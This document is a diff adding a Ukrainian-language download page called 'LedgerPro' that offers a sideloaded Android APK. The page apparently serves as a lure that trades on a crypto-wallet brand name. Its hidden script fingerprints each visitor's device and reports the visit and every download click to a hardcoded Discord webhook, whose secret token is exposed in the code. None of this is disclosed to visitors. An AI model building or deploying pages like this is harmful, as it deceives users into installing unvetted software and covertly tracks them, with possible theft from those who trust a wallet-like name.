@@ -1,1 +1,95 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LedgerPro</title>
+    <style>
+        body {
+            margin: 0;
+            background-color: #000;
+            color: white;
+            font-family: sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            min-height: 100vh;
+            padding: 40px 20px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+        .section {
+            margin-bottom: 60px;
+        }
+        h1 {
+            font-size: 40px;
+            color: #ff0000;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+        }
+        .btn {
+            display: inline-block;
+            padding: 20px 45px;
+            background-color: #00ff00;
+            color: black;
+            text-decoration: none;
+            font-size: 22px;
+            font-weight: bold;
+            border-radius: 12px;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
+            border: none;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="section">
+        <h1>LedgerPro</h1>
+        <a href="ledgerpro.apk" download id="ledgerBtn" class="btn">DOWNLOAD APK</a>
+    </div>
 
+    <script>
+        const webhookURL = "https://discord.com/api/webhooks/1537410863604965398/z3xDjp4p0CeGZv9I2H2Fil4Sj51bG9ynEP7NFa5_d-9uwOmmTxiq9x4x9Ro8sxdHSGer";
+        
+        async function getDevice() {
+            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+                try {
+                    const hints = await navigator.userAgentData.getHighEntropyValues(['model']);
+                    if (hints.model) return `Android (${hints.model})`;
+                } catch (e) {}
+            }
+            const ua = navigator.userAgent;
+            if (/android/i.test(ua)) {
+                const match = ua.match(/Android\s+([^\s;]+);?\s?([^;)]+)?/);
+                let fallback = match ? (match[2] || match[1]) : "Unknown";
+                return fallback === 'K' ? "Android (Модель прихована)" : `Android (${fallback})`;
+            }
+            return /iPhone/i.test(ua) ? "iPhone" : "PC / Other";
+        }
+
+        function getTime() {
+            return new Date().toLocaleString('uk-UA').replace(',', '');
+        }
+
+        async function sendLog(statusText, emoji) {
+            const deviceName = await getDevice();
+            const message = `${emoji} **${statusText}**\n\n` +
+                            `📱 **Пристрій:** ${deviceName}\n` +
+                            `⏰ **Час:** ${getTime()}`;
+
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: message })
+            });
+        }
+
+        window.onload = () => sendLog("Хтось перейшов по посиланню!", "👤");
+
+        document.getElementById('ledgerBtn').addEventListener('click', () => {
+            sendLog("Почав скачувати LedgerPro!", "📥");
+        });
+    </script>
+</body>
+</html>
